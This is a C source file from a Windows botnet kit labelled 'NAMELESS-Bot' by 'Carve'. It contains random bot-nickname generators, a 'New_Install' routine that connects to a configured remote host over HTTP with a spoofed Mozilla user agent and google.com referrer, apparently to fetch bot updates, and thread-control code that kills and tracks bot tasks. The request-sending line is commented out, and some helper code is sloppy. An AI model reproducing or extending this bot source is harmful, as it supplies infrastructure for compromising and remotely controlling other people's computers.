/*
            [ N A M E L E S S - Bot ]
            [       by: Carve       ]

            Thanks To; The Rogue & t0nix
*/

#include "global.h"
#include <wininet.h>

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

char *rndLetter(unsigned int len)
{
	char			*nk;
	unsigned int	i;

	if (len == 0 || len > 16)
		len = rand()%(16-3) + 3;

	nk = (char *) malloc (len + 1);

	for (i = 0; i <= len; i++)
		nk[i] = (rand()%26) + 97;

	nk[len] = 0;

	return nk;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

DWORD WINAPI New_Install(LPVOID param)
{
	HINTERNET ch = 0, req = 0;
	HANDLE ih;

	const char *accept = "*/*";
	char vhost[128], vuser[128], vpass[128], vpath[256];

	// zero out string varaiables
	memset(vhost, 0, sizeof(vhost));
	memset(vuser, 0, sizeof(vuser));
	memset(vpass, 0, sizeof(vpass));
	memset(vpath, 0, sizeof(vpath));

	// zero out url structure and set options
	URL_COMPONENTS url;
	memset(&url, 0, sizeof(url));
	url.dwStructSize = sizeof(url);
	url.dwHostNameLength = 1;
    url.dwUserNameLength = 1;
    url.dwPasswordLength = 1;
    url.dwUrlPathLength = 1;

	do {
		// crack the url (break it into its main parts)
		if (!InternetCrackUrl(NewInstall_Host, strlen(NewInstall_Host), 0, &url)) {
			break;
		}

		// copy url parts into variables
		if (url.dwHostNameLength > 0)
			strncpy(vhost, url.lpszHostName, url.dwHostNameLength);
		unsigned short vport = url.nPort;
		if (url.dwUserNameLength > 0)
			strncpy(vuser, url.lpszUserName, url.dwUserNameLength);
		if (url.dwPasswordLength > 0)
			strncpy(vpass, url.lpszPassword, url.dwPasswordLength);
		if (url.dwUrlPathLength > 0)
			strncpy(vpath, url.lpszUrlPath, url.dwUrlPathLength);

        ih = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		ch = InternetConnect(ih, vhost,vport, vuser, vpass, INTERNET_SERVICE_HTTP, 0, 0);
		if (ch == NULL) {
			break;
		}

		req = HttpOpenRequest(ch, NULL, vpath, NULL, "http://google.com", &accept, INTERNET_FLAG_NO_UI, 0);
		if (req == NULL) {
			break;
		}

		//if (HttpSendRequest(req, NULL, 0, NULL, 0))
			//success
		//else
            //error

	} while(0); // always false, so this never loops, only helps make error handling easier

	InternetCloseHandle(ch);
	InternetCloseHandle(req);

	Thread_Clear(threadnum);

	ExitThread(0);
}


/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

char *my_nktype(void)
 {
   char *tmp,*nk,*ctr;


   	int len=(rand()%5)+7,i;
	nk=(char*)malloc(len+1024);
    memset(nk,0,len+1+20);
    ctr=(char*)malloc(1024);
    memset(ctr,0,1024);
    tmp=(char*)malloc(len+1024);
    memset(tmp,0,len+1);
    srand( (unsigned)time( NULL ) );
    for (i=0;i<len;i++) tmp[i]=(rand()%(91-65))+65;

	//nk = ABCDEFG
    strcat(nk, tmp);

   return nk; //send nk out
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

unsigned int get_host(char *host)
{
    struct	hostent		*hp;
    unsigned int		host_ip;

    host_ip = my_inet_addr(host);
    if (host_ip == INADDR_NONE)
	{
        hp = my_gethostbyname(host);
        if (hp == 0)
            return 0;
		else
			host_ip = *(u_int *)(hp->h_addr);
    }

    return host_ip;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

/************************************************************************************\
|* start threads                                                                    *|
\************************************************************************************/
void Thread_Prepare()
{
	int		i;

	for (i = 0; i < MAX_THREADS; i++)
	{
		threads[i].tHandle = NULL;
		threads[i].type = NONE;
	}
}

int Thread_Add(thread_type type)
{
	int		i;

	for (i = 0; i < MAX_THREADS; i++)
		if (threads[i].tHandle == NULL)
			break;

	if (i == MAX_THREADS)
		i = -1;
	else
		threads[i].type = type;

#ifdef DEBUG
	printf("Adding thread number: %d\n", i);
#endif

	return i;
}

int Thread_Check(thread_type type)
{
	int		i,
			k = 0;

	for (i = 0; i < MAX_THREADS; i++)
		if (threads[i].type == type)
			k++;

	return k;
}

void Thread_Clear(int num)
{
	threads[num].tHandle = NULL;
	threads[num].type = NONE;
	my_closesocket(threads[num].tsock);
}

int Thread_Kill(thread_type type)
{
	int		i,
			k = 0;

	for (i = 0; i < MAX_THREADS; i++)
	{
		if (threads[i].type == type)
		{
			TerminateThread(threads[i].tHandle, 0);
			Thread_Clear(i);
			k++;
		}
	}

	return k;
}

HANDLE Thread_Start(LPTHREAD_START_ROUTINE function, LPVOID param, BOOL wait)
{
	DWORD		id = 0;
	HANDLE		tHandle;

	tHandle = CreateThread(NULL, 0, function, (LPVOID)param, 0, &id);

	if (wait)
	{
		WaitForSingleObject(tHandle, INFINITE);
		CloseHandle(tHandle);
	}
	else
		Sleep(THREAD_WAIT_TIME);

	return tHandle;
}

/************************************************************************************\
|* end threads                                                                      *|
\************************************************************************************/
